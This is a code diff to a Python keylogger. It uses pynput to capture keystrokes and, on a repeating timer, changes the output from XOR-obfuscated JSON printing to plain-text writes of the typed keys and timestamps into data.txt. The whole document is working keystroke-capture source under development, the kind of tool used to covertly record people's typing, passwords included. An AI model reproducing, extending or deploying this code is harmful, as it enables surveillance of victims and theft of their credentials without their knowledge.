@@ -2,6 +2,9 @@ import threading
 from pynput import keyboard
 from datetime import datetime
 import json
+import os
+from flask import jsonify
+
 
 
 class IKeylogger:
@@ -34,24 +37,27 @@ class AddToFile(IKeylogger):
     def __init__(self):
         super().__init__()
         self.timestamps = []
-
-    def print_json(self):
-        if self.my_list:
-            combined_keys = "".join(self.my_list)  # join list, not str(list)
-            self.timestamps.append(datetime.now().strftime("%d/%m/%Y %H:%M:%S"))
-            print(json.dumps({"timestamps": self.timestamps, "keys": self.xor_encrypt(combined_keys, "0123456789")}))
-            log_entry = {
-                "timestamps": self.timestamps,
-                "keys": self.xor_encrypt(combined_keys, "0123456789")
-            }
         threading.Timer(5, self.print_json).start()
+
+
+    def print_json(self,count=False,filename="data.txt"):
+        combined_keys = "".join(self.my_list)# join list, not str(list)
+
+        self.timestamps=(datetime.now().strftime("%d/%m/%Y %H:%M:%S"))
+        data = combined_keys + "\n" + self.timestamps
+        if not os.path.exists(filename):
+            mode = "w"
+        else:
+            mode = "a"
+        if combined_keys:
+            with open(filename, mode) as f:
+                f.write(data+"\n")
         self.my_list = []
         self.timestamps = []
+        if not count:
+            threading.Timer(5, self.print_json).start()
 
 
-    def write_to_json(self, log_entry):
-        with open("logs.json", "a") as f:
-            f.write(json.dumps(log_entry) + "\n")
 
     def xor_encrypt(self, text, key):
         return ''.join(f"{ord(c) ^ ord(key[i % len(key)]):02x}"
@@ -68,7 +74,8 @@ class Manager:
 
     def run(self):
         self.keylogger.start_logging()
-        self.keylogger.print_json()
+        self.keylogger.print_json(True,"data.txt")
+
 
 
 Manager().run()
